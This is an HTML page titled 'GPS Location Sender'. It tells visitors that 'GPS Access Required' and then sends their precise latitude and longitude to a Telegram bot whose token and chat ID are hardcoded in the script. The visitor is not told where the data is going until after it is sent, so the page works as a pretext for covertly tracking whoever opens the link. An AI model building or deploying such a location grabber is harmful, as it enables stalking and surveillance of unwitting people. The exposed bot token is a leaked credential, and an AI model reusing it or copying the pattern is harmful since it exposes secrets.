<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GPS Location Sender</title>
</head>
<body>
  <h1>📍 GPS Access Required</h1>
  <button onclick="getLocation()">Activate GPS</button>
  <p id="status">Waiting for user action...</p>

  <script>
    const BOT_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
    const CHAT_ID = "6978055162";

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then(res => {
          document.getElementById("status").innerText = res.ok
            ? "✅ Location sent to Telegram."
            : "❌ Failed to send location.";
        })
        .catch(() => {
          document.getElementById("status").innerText = "❌ Error sending location.";
        });
    }

    function getLocation() {
      document.getElementById("status").innerText = "Requesting GPS access...";
      
      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "❌ Geolocation not supported.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          const message = `📍 User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
          sendToTelegram(message);
        },
        (error) => {
          const errors = {
            1: "❌ Permission denied.",
            2: "❌ Location unavailable.",
            3: "❌ Request timed out.",
          };
          document.getElementById("status").innerText = errors[error.code] || "❌ Unknown error.";
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  </script>
</body>
</html>